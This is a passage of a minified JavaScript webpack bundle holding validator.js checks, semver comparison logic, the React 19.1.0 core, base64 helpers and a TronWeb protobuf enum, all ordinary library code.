                FI: a,
                FR: /^\d{2}\s?\d{3}$/,
                GB: /^(gir\s?0aa|[a-z]{1,2}\d[\da-z]?\s?(\d[a-z]{2})?)$/i,
                GR: /^\d{3}\s?\d{2}$/,
                HR: /^([1-5]\d{4}$)/,
                HT: /^HT\d{4}$/,
                HU: s,
                ID: a,
                IE: /^(?!.*(?:o))[A-Za-z]\d[\dw]\s\w{4}$/i,
                IL: /^(\d{5}|\d{7})$/,
                IN: /^((?!10|29|35|54|55|65|66|86|87|88|89)[1-9][0-9]{5})$/,
                IR: /^(?!(\d)\1{3})[13-9]{4}[1346-9][013-9]{5}$/,
                IS: i,
                IT: a,
                JP: /^\d{3}\-\d{4}$/,
                KE: a,
                KR: /^(\d{5}|\d{6})$/,
                LI: /^(948[5-9]|949[0-7])$/,
                LT: /^LT\-\d{5}$/,
                LU: s,
                LV: /^LV\-\d{4}$/,
                LK: a,
                MG: i,
                MX: a,
                MT: /^[A-Za-z]{3}\s{0,1}\d{4}$/,
                MY: a,
                NL: /^[1-9]\d{3}\s?(?!sa|sd|ss)[a-z]{2}$/i,
                NO: s,
                NP: /^(10|21|22|32|33|34|44|45|56|57)\d{3}$|^(977)$/i,
                NZ: s,
                PL: /^\d{2}\-\d{3}$/,
                PR: /^00[679]\d{2}([ -]\d{4})?$/,
                PT: /^\d{4}\-\d{3}?$/,
                RO: c,
                RU: c,
                SA: a,
                SE: /^[1-9]\d{2}\s?\d{2}$/,
                SG: c,
                SI: s,
                SK: /^\d{3}\s?\d{2}$/,
                TH: a,
                TN: s,
                TW: /^\d{3}(\d{2})?$/,
                UA: a,
                US: /^\d{5}(-\d{4})?$/,
                ZA: s,
                ZM: a
            };
            t.locales = Object.keys(l)
        }
        ,
        3756: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                n.default)(e),
                (t = (0,
                o.default)(t, c)).crockford)
                    return a.test(e);
                if (e.length % 8 === 0 && s.test(e))
                    return !0;
                return !1
            }
            ;
            var n = i(r(8804))
              , o = i(r(3975));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = /^[A-Z2-7]+=*$/
              , a = /^[A-HJKMNP-TV-Z0-9]+$/
              , c = {
                crockford: !1
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3822: (e, t, r) => {
            const n = r(77)
              , o = r(4426)
              , {ANY: i} = o
              , s = r(5024)
              , a = r(4950)
              , c = [new o(">=0.0.0-0")]
              , l = [new o(">=0.0.0")]
              , u = (e, t, r) => {
                if (e === t)
                    return !0;
                if (1 === e.length && e[0].semver === i) {
                    if (1 === t.length && t[0].semver === i)
                        return !0;
                    e = r.includePrerelease ? c : l
                }
                if (1 === t.length && t[0].semver === i) {
                    if (r.includePrerelease)
                        return !0;
                    t = l
                }
                const n = new Set;
                let o, u, f, p, g, y, m;
                for (const i of e)
                    ">" === i.operator || ">=" === i.operator ? o = d(o, i, r) : "<" === i.operator || "<=" === i.operator ? u = h(u, i, r) : n.add(i.semver);
                if (n.size > 1)
                    return null;
                if (o && u) {
                    if (f = a(o.semver, u.semver, r),
                    f > 0)
                        return null;
                    if (0 === f && (">=" !== o.operator || "<=" !== u.operator))
                        return null
                }
                for (const i of n) {
                    if (o && !s(i, String(o), r))
                        return null;
                    if (u && !s(i, String(u), r))
                        return null;
                    for (const e of t)
                        if (!s(i, String(e), r))
                            return !1;
                    return !0
                }
                let b = !(!u || r.includePrerelease || !u.semver.prerelease.length) && u.semver
                  , v = !(!o || r.includePrerelease || !o.semver.prerelease.length) && o.semver;
                b && 1 === b.prerelease.length && "<" === u.operator && 0 === b.prerelease[0] && (b = !1);
                for (const i of t) {
                    if (m = m || ">" === i.operator || ">=" === i.operator,
                    y = y || "<" === i.operator || "<=" === i.operator,
                    o)
                        if (v && i.semver.prerelease && i.semver.prerelease.length && i.semver.major === v.major && i.semver.minor === v.minor && i.semver.patch === v.patch && (v = !1),
                        ">" === i.operator || ">=" === i.operator) {
                            if (p = d(o, i, r),
                            p === i && p !== o)
                                return !1
                        } else if (">=" === o.operator && !s(o.semver, String(i), r))
                            return !1;
                    if (u)
                        if (b && i.semver.prerelease && i.semver.prerelease.length && i.semver.major === b.major && i.semver.minor === b.minor && i.semver.patch === b.patch && (b = !1),
                        "<" === i.operator || "<=" === i.operator) {
                            if (g = h(u, i, r),
                            g === i && g !== u)
                                return !1
                        } else if ("<=" === u.operator && !s(u.semver, String(i), r))
                            return !1;
                    if (!i.operator && (u || o) && 0 !== f)
                        return !1
                }
                return !(o && y && !u && 0 !== f) && (!(u && m && !o && 0 !== f) && (!v && !b))
            }
              , d = (e, t, r) => {
                if (!e)
                    return t;
                const n = a(e.semver, t.semver, r);
                return n > 0 ? e : n < 0 || ">" === t.operator && ">=" === e.operator ? t : e
            }
              , h = (e, t, r) => {
                if (!e)
                    return t;
                const n = a(e.semver, t.semver, r);
                return n < 0 ? e : n > 0 || "<" === t.operator && "<=" === e.operator ? t : e
            }
            ;
            e.exports = function(e, t) {
                let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                if (e === t)
                    return !0;
                e = new n(e,r),
                t = new n(t,r);
                let o = !1;
                e: for (const n of e.set) {
                    for (const e of t.set) {
                        const t = u(n, e, r);
                        if (o = o || null !== t,
                        t)
                            continue e
                    }
                    if (o)
                        return !1
                }
                return !0
            }
        }
        ,
        3835: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                n.default)(e),
                t = (0,
                o.default)(t, c);
                var r = e.length;
                if (t.urlSafe)
                    return a.test(e);
                if (r % 4 !== 0 || s.test(e))
                    return !1;
                var i = e.indexOf("=");
                return -1 === i || i === r - 1 || i === r - 2 && "=" === e[r - 1]
            }
            ;
            var n = i(r(8804))
              , o = i(r(3975));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = /[^A-Z0-9+\/=]/i
              , a = /^[A-Z0-9_\-]*$/i
              , c = {
                urlSafe: !1
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3851: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t, r) {
                (0,
                o.default)(e),
                "[object RegExp]" !== Object.prototype.toString.call(t) && (t = new RegExp(t,r));
                return !!e.match(t)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        3901: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            const n = r(6121);
            n.__exportStar(r(5871), t),
            n.__exportStar(r(1822), t),
            n.__exportStar(r(1067), t),
            n.__exportStar(r(8251), t)
        }
        ,
        3975: (e, t) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function() {
                var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
                  , t = arguments.length > 1 ? arguments[1] : void 0;
                for (var r in t)
                    "undefined" === typeof e[r] && (e[r] = t[r]);
                return e
            }
            ,
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        4068: e => {
            e.exports = class {
                constructor() {
                    this.max = 1e3,
                    this.map = new Map
                }
                get(e) {
                    const t = this.map.get(e);
                    return void 0 === t ? void 0 : (this.map.delete(e),
                    this.map.set(e, t),
                    t)
                }
                delete(e) {
                    return this.map.delete(e)
                }
                set(e, t) {
                    if (!this.delete(e) && void 0 !== t) {
                        if (this.map.size >= this.max) {
                            const e = this.map.keys().next().value;
                            this.delete(e)
                        }
                        this.map.set(e, t)
                    }
                    return this
                }
            }
        }
        ,
        4162: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                e === e.toUpperCase()
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        4195: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                if ((0,
                o.default)(e),
                !i.test(e))
                    return !1;
                for (var t = !0, r = 0, n = e.length - 2; n >= 0; n--)
                    if (e[n] >= "A" && e[n] <= "Z")
                        for (var s = e[n].charCodeAt(0) - 55, a = 0, c = [s % 10, Math.trunc(s / 10)]; a < c.length; a++) {
                            var l = c[a];
                            r += t ? l >= 5 ? 1 + 2 * (l - 5) : 2 * l : l,
                            t = !t
                        }
                    else {
                        var u = e[n].charCodeAt(0) - "0".charCodeAt(0);
                        r += t ? u >= 5 ? 1 + 2 * (u - 5) : 2 * u : u,
                        t = !t
                    }
                var d = 10 * Math.trunc((r + 9) / 10) - r;
                return +e[e.length - 1] === d
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^[A-Z]{2}[0-9A-Z]{9}[0-9]$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        4231: (e, t, r) => {
            const n = r(9398);
            e.exports = (e, t, r) => {
                const o = new n(e,r)
                  , i = new n(t,r);
                return o.compare(i) || o.compareBuild(i)
            }
        }
        ,
        4240: (e, t, r) => {
            const n = r(2282);
            e.exports = (e, t) => {
                const r = n(e.trim().replace(/^[=v]+/, ""), t);
                return r ? r.version : null
            }
        }
        ,
        4277: (e, t) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                var r = e.join("");
                return new RegExp(r,t)
            }
            ,
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        4288: (e, t) => {
            "use strict";
            var r = Symbol.for("react.transitional.element")
              , n = Symbol.for("react.portal")
              , o = Symbol.for("react.fragment")
              , i = Symbol.for("react.strict_mode")
              , s = Symbol.for("react.profiler")
              , a = Symbol.for("react.consumer")
              , c = Symbol.for("react.context")
              , l = Symbol.for("react.forward_ref")
              , u = Symbol.for("react.suspense")
              , d = Symbol.for("react.memo")
              , h = Symbol.for("react.lazy")
              , f = Symbol.iterator;
            var p = {
                isMounted: function() {
                    return !1
                },
                enqueueForceUpdate: function() {},
                enqueueReplaceState: function() {},
                enqueueSetState: function() {}
            }
              , g = Object.assign
              , y = {};
            function m(e, t, r) {
                this.props = e,
                this.context = t,
                this.refs = y,
                this.updater = r || p
            }
            function b() {}
            function v(e, t, r) {
                this.props = e,
                this.context = t,
                this.refs = y,
                this.updater = r || p
            }
            m.prototype.isReactComponent = {},
            m.prototype.setState = function(e, t) {
                if ("object" !== typeof e && "function" !== typeof e && null != e)
                    throw Error("takes an object of state variables to update or a function which returns an object of state variables.");
                this.updater.enqueueSetState(this, e, t, "setState")
            }
            ,
            m.prototype.forceUpdate = function(e) {
                this.updater.enqueueForceUpdate(this, e, "forceUpdate")
            }
            ,
            b.prototype = m.prototype;
            var w = v.prototype = new b;
            w.constructor = v,
            g(w, m.prototype),
            w.isPureReactComponent = !0;
            var T = Array.isArray
              , A = {
                H: null,
                A: null,
                T: null,
                S: null,
                V: null
            }
              , E = Object.prototype.hasOwnProperty;
            function P(e, t, n, o, i, s) {
                return n = s.ref,
                {
                    $$typeof: r,
                    type: e,
                    key: t,
                    ref: void 0 !== n ? n : null,
                    props: s
                }
            }
            function C(e) {
                return "object" === typeof e && null !== e && e.$$typeof === r
            }
            var S = /\/+/g;
            function I(e, t) {
                return "object" === typeof e && null !== e && null != e.key ? function(e) {
                    var t = {
                        "=": "=0",
                        ":": "=2"
                    };
                    return "$" + e.replace(/[=:]/g, (function(e) {
                        return t[e]
                    }
                    ))
                }("" + e.key) : t.toString(36)
            }
            function B() {}
            function x(e, t, o, i, s) {
                var a = typeof e;
                "undefined" !== a && "boolean" !== a || (e = null);
                var c, l, u = !1;
                if (null === e)
                    u = !0;
                else
                    switch (a) {
                    case "bigint":
                    case "string":
                    case "number":
                        u = !0;
                        break;
                    case "object":
                        switch (e.$$typeof) {
                        case r:
                        case n:
                            u = !0;
                            break;
                        case h:
                            return x((u = e._init)(e._payload), t, o, i, s)
                        }
                    }
                if (u)
                    return s = s(e),
                    u = "" === i ? "." + I(e, 0) : i,
                    T(s) ? (o = "",
                    null != u && (o = u.replace(S, "$&/") + "/"),
                    x(s, t, o, "", (function(e) {
                        return e
                    }
                    ))) : null != s && (C(s) && (c = s,
                    l = o + (null == s.key || e && e.key === s.key ? "" : ("" + s.key).replace(S, "$&/") + "/") + u,
                    s = P(c.type, l, void 0, 0, 0, c.props)),
                    t.push(s)),
                    1;
                u = 0;
                var d, p = "" === i ? "." : i + ":";
                if (T(e))
                    for (var g = 0; g < e.length; g++)
                        u += x(i = e[g], t, o, a = p + I(i, g), s);
                else if ("function" === typeof (g = null === (d = e) || "object" !== typeof d ? null : "function" === typeof (d = f && d[f] || d["@@iterator"]) ? d : null))
                    for (e = g.call(e),
                    g = 0; !(i = e.next()).done; )
                        u += x(i = i.value, t, o, a = p + I(i, g++), s);
                else if ("object" === a) {
                    if ("function" === typeof e.then)
                        return x(function(e) {
                            switch (e.status) {
                            case "fulfilled":
                                return e.value;
                            case "rejected":
                                throw e.reason;
                            default:
                                switch ("string" === typeof e.status ? e.then(B, B) : (e.status = "pending",
                                e.then((function(t) {
                                    "pending" === e.status && (e.status = "fulfilled",
                                    e.value = t)
                                }
                                ), (function(t) {
                                    "pending" === e.status && (e.status = "rejected",
                                    e.reason = t)
                                }
                                ))),
                                e.status) {
                                case "fulfilled":
                                    return e.value;
                                case "rejected":
                                    throw e.reason
                                }
                            }
                            throw e
                        }(e), t, o, i, s);
                    throw t = String(e),
                    Error("Objects are not valid as a React child (found: " + ("[object Object]" === t ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.")
                }
                return u
            }
            function O(e, t, r) {
                if (null == e)
                    return e;
                var n = []
                  , o = 0;
                return x(e, n, "", "", (function(e) {
                    return t.call(r, e, o++)
                }
                )),
                n
            }
            function _(e) {
                if (-1 === e._status) {
                    var t = e._result;
                    (t = t()).then((function(t) {
                        0 !== e._status && -1 !== e._status || (e._status = 1,
                        e._result = t)
                    }
                    ), (function(t) {
                        0 !== e._status && -1 !== e._status || (e._status = 2,
                        e._result = t)
                    }
                    )),
                    -1 === e._status && (e._status = 0,
                    e._result = t)
                }
                if (1 === e._status)
                    return e._result.default;
                throw e._result
            }
            var W = "function" === typeof reportError ? reportError : function(e) {
                if ("object" === typeof window && "function" === typeof window.ErrorEvent) {
                    var t = new window.ErrorEvent("error",{
                        bubbles: !0,
                        cancelable: !0,
                        message: "object" === typeof e && null !== e && "string" === typeof e.message ? String(e.message) : String(e),
                        error: e
                    });
                    if (!window.dispatchEvent(t))
                        return
                } else if ("object" === typeof process && "function" === typeof process.emit)
                    return void process.emit("uncaughtException", e);
                console.error(e)
            }
            ;
            function R() {}
            t.Children = {
                map: O,
                forEach: function(e, t, r) {
                    O(e, (function() {
                        t.apply(this, arguments)
                    }
                    ), r)
                },
                count: function(e) {
                    var t = 0;
                    return O(e, (function() {
                        t++
                    }
                    )),
                    t
                },
                toArray: function(e) {
                    return O(e, (function(e) {
                        return e
                    }
                    )) || []
                },
                only: function(e) {
                    if (!C(e))
                        throw Error("React.Children.only expected to receive a single React element child.");
                    return e
                }
            },
            t.Component = m,
            t.Fragment = o,
            t.Profiler = s,
            t.PureComponent = v,
            t.StrictMode = i,
            t.Suspense = u,
            t.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE = A,
            t.__COMPILER_RUNTIME = {
                __proto__: null,
                c: function(e) {
                    return A.H.useMemoCache(e)
                }
            },
            t.cache = function(e) {
                return function() {
                    return e.apply(null, arguments)
                }
            }
            ,
            t.cloneElement = function(e, t, r) {
                if (null === e || void 0 === e)
                    throw Error("The argument must be a React element, but you passed " + e + ".");
                var n = g({}, e.props)
                  , o = e.key;
                if (null != t)
                    for (i in void 0 !== t.ref && void 0,
                    void 0 !== t.key && (o = "" + t.key),
                    t)
                        !E.call(t, i) || "key" === i || "__self" === i || "__source" === i || "ref" === i && void 0 === t.ref || (n[i] = t[i]);
                var i = arguments.length - 2;
                if (1 === i)
                    n.children = r;
                else if (1 < i) {
                    for (var s = Array(i), a = 0; a < i; a++)
                        s[a] = arguments[a + 2];
                    n.children = s
                }
                return P(e.type, o, void 0, 0, 0, n)
            }
            ,
            t.createContext = function(e) {
                return (e = {
                    $$typeof: c,
                    _currentValue: e,
                    _currentValue2: e,
                    _threadCount: 0,
                    Provider: null,
                    Consumer: null
                }).Provider = e,
                e.Consumer = {
                    $$typeof: a,
                    _context: e
                },
                e
            }
            ,
            t.createElement = function(e, t, r) {
                var n, o = {}, i = null;
                if (null != t)
                    for (n in void 0 !== t.key && (i = "" + t.key),
                    t)
                        E.call(t, n) && "key" !== n && "__self" !== n && "__source" !== n && (o[n] = t[n]);
                var s = arguments.length - 2;
                if (1 === s)
                    o.children = r;
                else if (1 < s) {
                    for (var a = Array(s), c = 0; c < s; c++)
                        a[c] = arguments[c + 2];
                    o.children = a
                }
                if (e && e.defaultProps)
                    for (n in s = e.defaultProps)
                        void 0 === o[n] && (o[n] = s[n]);
                return P(e, i, void 0, 0, 0, o)
            }
            ,
            t.createRef = function() {
                return {
                    current: null
                }
            }
            ,
            t.forwardRef = function(e) {
                return {
                    $$typeof: l,
                    render: e
                }
            }
            ,
            t.isValidElement = C,
            t.lazy = function(e) {
                return {
                    $$typeof: h,
                    _payload: {
                        _status: -1,
                        _result: e
                    },
                    _init: _
                }
            }
            ,
            t.memo = function(e, t) {
                return {
                    $$typeof: d,
                    type: e,
                    compare: void 0 === t ? null : t
                }
            }
            ,
            t.startTransition = function(e) {
                var t = A.T
                  , r = {};
                A.T = r;
                try {
                    var n = e()
                      , o = A.S;
                    null !== o && o(r, n),
                    "object" === typeof n && null !== n && "function" === typeof n.then && n.then(R, W)
                } catch (i) {
                    W(i)
                } finally {
                    A.T = t
                }
            }
            ,
            t.unstable_useCacheRefresh = function() {
                return A.H.useCacheRefresh()
            }
            ,
            t.use = function(e) {
                return A.H.use(e)
            }
            ,
            t.useActionState = function(e, t, r) {
                return A.H.useActionState(e, t, r)
            }
            ,
            t.useCallback = function(e, t) {
                return A.H.useCallback(e, t)
            }
            ,
            t.useContext = function(e) {
                return A.H.useContext(e)
            }
            ,
            t.useDebugValue = function() {}
            ,
            t.useDeferredValue = function(e, t) {
                return A.H.useDeferredValue(e, t)
            }
            ,
            t.useEffect = function(e, t, r) {
                var n = A.H;
                if ("function" === typeof r)
                    throw Error("useEffect CRUD overload is not enabled in this build of React.");
                return n.useEffect(e, t)
            }
            ,
            t.useId = function() {
                return A.H.useId()
            }
            ,
            t.useImperativeHandle = function(e, t, r) {
                return A.H.useImperativeHandle(e, t, r)
            }
            ,
            t.useInsertionEffect = function(e, t) {
                return A.H.useInsertionEffect(e, t)
            }
            ,
            t.useLayoutEffect = function(e, t) {
                return A.H.useLayoutEffect(e, t)
            }
            ,
            t.useMemo = function(e, t) {
                return A.H.useMemo(e, t)
            }
            ,
            t.useOptimistic = function(e, t) {
                return A.H.useOptimistic(e, t)
            }
            ,
            t.useReducer = function(e, t, r) {
                return A.H.useReducer(e, t, r)
            }
            ,
            t.useRef = function(e) {
                return A.H.useRef(e)
            }
            ,
            t.useState = function(e) {
                return A.H.useState(e)
            }
            ,
            t.useSyncExternalStore = function(e, t, r) {
                return A.H.useSyncExternalStore(e, t, r)
            }
            ,
            t.useTransition = function() {
                return A.H.useTransition()
            }
            ,
            t.version = "19.1.0"
        }
        ,
        4341: (e, t, r) => {
            var n = r(7248)
              , o = "undefined" !== typeof globalThis && globalThis || "undefined" !== typeof window && window || "undefined" !== typeof o && o || "undefined" !== typeof self && self || function() {
                return this
            }
            .call(null) || Function("return this")();
            n.exportSymbol("TronWebProto.ResourceCode", null, o),
            TronWebProto.ResourceCode = {
                BANDWIDTH: 0,
                ENERGY: 1,
                TRON_POWER: 2
            },
            n.object.extend(t, TronWebProto)
        }
        ,
        4358: (e, t) => {
            "use strict";
            const r = /^[\u0021-\u003A\u003C\u003E-\u007E]+$/
              , n = /^[\u0021-\u003A\u003C-\u007E]*$/
              , o = /^([.]?[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)([.][a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)*$/i
              , i = /^[\u0020-\u003A\u003D-\u007E]*$/
              , s = Object.prototype.toString
              , a = ( () => {
                const e = function() {};
                return e.prototype = Object.create(null),
                e
            }
            )();
            function c(e, t, r) {
                do {
                    const r = e.charCodeAt(t);
                    if (32 !== r && 9 !== r)
                        return t
                } while (++t < r);
                return r
            }
            function l(e, t, r) {
                for (; t > r; ) {
                    const r = e.charCodeAt(--t);
                    if (32 !== r && 9 !== r)
                        return t + 1
                }
                return r
            }
            function u(e) {
                if (-1 === e.indexOf("%"))
                    return e;
                try {
                    return decodeURIComponent(e)
                } catch (t) {
                    return e
                }
            }
        }
        ,
        4391: (e, t, r) => {
            "use strict";
            !function e() {
                if ("undefined" !== typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ && "function" === typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)
                    try {
                        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e)
                    } catch (t) {
                        console.error(t)
                    }
            }(),
            e.exports = r(7004)
        }
        ,
        4426: (e, t, r) => {
            const n = Symbol("SemVer ANY");
            class o {
                static get ANY() {
                    return n
                }
                constructor(e, t) {
                    if (t = i(t),
                    e instanceof o) {
                        if (e.loose === !!t.loose)
                            return e;
                        e = e.value
                    }
                    e = e.trim().split(/\s+/).join(" "),
                    l("comparator", e, t),
                    this.options = t,
                    this.loose = !!t.loose,
                    this.parse(e),
                    this.semver === n ? this.value = "" : this.value = this.operator + this.semver.version,
                    l("comp", this)
                }
                parse(e) {
                    const t = this.options.loose ? s[a.COMPARATORLOOSE] : s[a.COMPARATOR]
                      , r = e.match(t);
                    if (!r)
                        throw new TypeError("Invalid comparator: ".concat(e));
                    this.operator = void 0 !== r[1] ? r[1] : "",
                    "=" === this.operator && (this.operator = ""),
                    r[2] ? this.semver = new u(r[2],this.options.loose) : this.semver = n
                }
                toString() {
                    return this.value
                }
                test(e) {
                    if (l("Comparator.test", e, this.options.loose),
                    this.semver === n || e === n)
                        return !0;
                    if ("string" === typeof e)
                        try {
                            e = new u(e,this.options)
                        } catch (t) {
                            return !1
                        }
                    return c(e, this.operator, this.semver, this.options)
                }
                intersects(e, t) {
                    if (!(e instanceof o))
                        throw new TypeError("a Comparator is required");
                    return "" === this.operator ? "" === this.value || new d(e.value,t).test(this.value) : "" === e.operator ? "" === e.value || new d(this.value,t).test(e.semver) : (!(t = i(t)).includePrerelease || "<0.0.0-0" !== this.value && "<0.0.0-0" !== e.value) && (!(!t.includePrerelease && (this.value.startsWith("<0.0.0") || e.value.startsWith("<0.0.0"))) && (!(!this.operator.startsWith(">") || !e.operator.startsWith(">")) || (!(!this.operator.startsWith("<") || !e.operator.startsWith("<")) || (!(this.semver.version !== e.semver.version || !this.operator.includes("=") || !e.operator.includes("=")) || (!!(c(this.semver, "<", e.semver, t) && this.operator.startsWith(">") && e.operator.startsWith("<")) || !!(c(this.semver, ">", e.semver, t) && this.operator.startsWith("<") && e.operator.startsWith(">")))))))
                }
            }
            e.exports = o;
            const i = r(5525)
              , {safeRe: s, t: a} = r(9040)
              , c = r(9085)
              , l = r(3338)
              , u = r(9398)
              , d = r(77)
        }
        ,
        4445: (e, t) => {
            "use strict";
            t.byteLength = function(e) {
                var t = a(e)
                  , r = t[0]
                  , n = t[1];
                return 3 * (r + n) / 4 - n
            }
            ,
            t.toByteArray = function(e) {
                var t, r, i = a(e), s = i[0], c = i[1], l = new o(function(e, t, r) {
                    return 3 * (t + r) / 4 - r
                }(0, s, c)), u = 0, d = c > 0 ? s - 4 : s;
                for (r = 0; r < d; r += 4)
                    t = n[e.charCodeAt(r)] << 18 | n[e.charCodeAt(r + 1)] << 12 | n[e.charCodeAt(r + 2)] << 6 | n[e.charCodeAt(r + 3)],
                    l[u++] = t >> 16 & 255,
                    l[u++] = t >> 8 & 255,
                    l[u++] = 255 & t;
                2 === c && (t = n[e.charCodeAt(r)] << 2 | n[e.charCodeAt(r + 1)] >> 4,
                l[u++] = 255 & t);
                1 === c && (t = n[e.charCodeAt(r)] << 10 | n[e.charCodeAt(r + 1)] << 4 | n[e.charCodeAt(r + 2)] >> 2,
                l[u++] = t >> 8 & 255,
                l[u++] = 255 & t);
                return l
            }
            ,
            t.fromByteArray = function(e) {
                for (var t, n = e.length, o = n % 3, i = [], s = 16383, a = 0, l = n - o; a < l; a += s)
                    i.push(c(e, a, a + s > l ? l : a + s));
                1 === o ? (t = e[n - 1],
                i.push(r[t >> 2] + r[t << 4 & 63] + "==")) : 2 === o && (t = (e[n - 2] << 8) + e[n - 1],
                i.push(r[t >> 10] + r[t >> 4 & 63] + r[t << 2 & 63] + "="));
                return i.join("")
            }
            ;
            for (var r = [], n = [], o = "undefined" !== typeof Uint8Array ? Uint8Array : Array, i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", s = 0; s < 64; ++s)
                r[s] = i[s],
                n[i.charCodeAt(s)] = s;
            function a(e) {
                var t = e.length;
                if (t % 4 > 0)
                    throw new Error("Invalid string. Length must be a multiple of 4");
                var r = e.indexOf("=");
                return -1 === r && (r = t),
                [r, r === t ? 0 : 4 - r % 4]
            }
            function c(e, t, n) {
                for (var o, i, s = [], a = t; a < n; a += 3)
                    o = (e[a] << 16 & 16711680) + (e[a + 1] << 8 & 65280) + (255 & e[a + 2]),
                    s.push(r[(i = o) >> 18 & 63] + r[i >> 12 & 63] + r[i >> 6 & 63] + r[63 & i]);
                return s.join("")
            }
            n["-".charCodeAt(0)] = 62,
            n["_".charCodeAt(0)] = 63
        }
        ,
        4450: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : i;
                if ((0,
                o.default)(e),
                t.loose)
                    return a.includes(e.toLowerCase());
                return s.includes(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                loose: !1
            }
              , s = ["true", "false", "1", "0"]
              , a = [].concat(s, ["yes", "no"]);
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        4611: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                i.test(e)
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^[^\s-_](?!.*?[-_]{2,})[a-z0-9-\\][^\s]*[^-_\s]$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        4650: (e, t, r) => {
            "use strict";
            function n(e) {
                return n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(e) {
                    return typeof e
                }
                : function(e) {
                    return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e
                }
                ,
                n(e)
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = void 0;
            var o = Je(r(7961))
              , i = Je(r(295))
              , s = Je(r(1640))
              , a = Je(r(8461))
              , c = Je(r(1557))
              , l = Je(r(2057))
              , u = Je(r(3851))
              , d = Je(r(498))
              , h = Je(r(9691))
              , f = Je(r(2305))
              , p = Je(r(6581))
              , g = Je(r(3212))
              , y = Je(r(7891))
              , m = Je(r(756))
              , b = Je(r(2605))
              , v = Je(r(4450))
              , w = Je(r(9678))
              , T = Je(r(1468))
              , A = Ye(r(8478))
              , E = Ye(r(8167))
              , P = Je(r(8729))
              , C = Je(r(6875))
              , S = Je(r(9355))
              , I = Je(r(8411))
              , B = Je(r(4162))
              , x = Je(r(8540))
              , O = Je(r(8221))
              , _ = Je(r(1621))
              , W = Je(r(477))
              , R = Je(r(5946))
              , k = Je(r(697))
              , M = Je(r(9148))
              , N = Je(r(4764))
              , F = Je(r(755))
              , U = Ye(r(5972))
              , D = Je(r(1949))
              , L = Je(r(1961))
              , j = Je(r(977))
              , z = Je(r(6796))
              , V = Je(r(8800))
              , H = Je(r(4742))
              , q = Je(r(6817))
              , G = Je(r(6099))
              , $ = Ye(r(6760))
              , K = Je(r(692))
              , Z = Je(r(7590))
              , Y = Je(r(1456))
              , J = Je(r(6591))
              , X = Je(r(2738))
              , Q = Je(r(407))
              , ee = Je(r(5664))
              , te = Je(r(3298))
              , re = Je(r(8239))
              , ne = Je(r(7267))
              , oe = Je(r(3192))
              , ie = Je(r(6907))
              , se = Je(r(559))
              , ae = Je(r(9700))
              , ce = Je(r(2903))
              , le = Je(r(2972))
              , ue = Je(r(5686))
              , de = Je(r(4195))
              , he = Je(r(3496))
              , fe = Je(r(3553))
              , pe = Je(r(9978))
              , ge = Ye(r(164))
              , ye = Je(r(602))
              , me = Je(r(3583))
              , be = Je(r(5749))
              , ve = r(2362)
              , we = Je(r(2310))
              , Te = Je(r(5062))
              , Ae = Je(r(1777))
              , Ee = Je(r(2626))
              , Pe = Je(r(1041))
              , Ce = Je(r(5477))
              , Se = Je(r(3756))
              , Ie = Je(r(88))
              , Be = Je(r(3835))
              , xe = Je(r(5184))
              , Oe = Je(r(7246))
              , _e = Je(r(7894))
              , We = Je(r(536))
              , Re = Je(r(2233))
              , ke = Ye(r(3710))
              , Me = Je(r(1238))
              , Ne = Je(r(1068))
              , Fe = Je(r(7244))
              , Ue = Je(r(6119))
